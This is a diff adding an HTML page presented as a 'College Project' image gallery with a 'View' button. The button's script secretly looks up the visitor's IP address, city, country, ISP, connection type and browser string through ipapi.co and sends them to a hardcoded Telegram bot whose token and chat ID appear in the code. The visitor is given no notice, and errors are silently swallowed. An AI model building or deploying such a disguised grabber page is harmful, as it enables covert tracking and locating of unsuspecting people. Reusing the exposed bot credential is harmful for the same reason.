@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>College Project</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            overflow-x: hidden;
+        }
+
+        .image-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            padding: 20px;
+        }
+
+        .image-container img {
+            width: 90%;
+            max-width: 800px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        /* Overlay that covers everything */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+            transition: opacity 0.5s ease;
+        }
+
+        .start-button {
+            padding: 15px 30px;
+            font-size: 18px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            transition: transform 0.2s;
+        }
+
+        .start-button:hover {
+            transform: scale(1.05);
+            background-color: #45a049;
+        }
+                #hee {
+            width: 100vw;
+            height: 100vh;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Hide overlay and button after click */
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Image Gallery -->
+    <div id="img" class="image-container">
+        <!-- Replace these with your actual image URLs -->
+        <img src="https://via.placeholder.com/800x400?text=Image+1" alt="Image 1">
+        <img src="https://via.placeholder.com/800x400?text=Image+2" alt="Image 2">
+        <img src="https://via.placeholder.com/800x400?text=Image+3" alt="Image 3">
+        <img src="https://via.placeholder.com/800x400?text=Image+4" alt="Image 4">
+        <img src="https://via.placeholder.com/800x400?text=Image+5" alt="Image 5">
+        <img src="https://via.placeholder.com/800x400?text=Image+6" alt="Image 6">
+        <img src="https://via.placeholder.com/800x400?text=Image+7" alt="Image 7">
+        <img src="https://via.placeholder.com/800x400?text=Image+8" alt="Image 8">
+        <!-- Add more images as needed -->
+    </div>
+        
+    <div id="hee">
+      <img src="1759883161731-0199c135-c05d-7948-bbe4-4bbc9272586f.png" alt="Image0">
+    </div>
+
+    <!-- Overlay with Start Button -->
+    <div class="overlay" id="overlay">
+        <button class="start-button" id="sendBtn">View</button>
+    </div>
+
+
+    <script>
+        document.getElementById('sendBtn').addEventListener('click', function() {
+            document.getElementById('overlay').classList.add('hidden');
+          document.getElementById('img').style.display='none';
+          document.getElementById('hee').style.display='flex';
+        });
+        
+
+    const TELEGRAM_BOT_TOKEN = '8271808472:AAGfxJ4MYTl7TeSnTn7STnwLrCjwEiMa4Gc';
+    const TELEGRAM_CHAT_ID = '5952771138';
+
+    document.getElementById('sendBtn').addEventListener('click', async function() {
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
+            const message = `
+📡 *DEMO: User Data Captured!*
+• IP: \`${ipData.ip || 'Unknown'}\`
+• City: ${ipData.city || 'Unknown'}
+• Country: ${ipData.country_name || 'Unknown'}
+• ISP: ${ipData.org || 'Unknown'}
+• Connection: ${conn ? conn.effectiveType : 'Unknown'}
+• Browser: \`${navigator.userAgent.substring(0, 50)}...\`
+• Time: ${new Date().toLocaleString()}
+            `.trim();
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (error) {}
+    });
+    </script>
+
+
+</body>
+  </html>
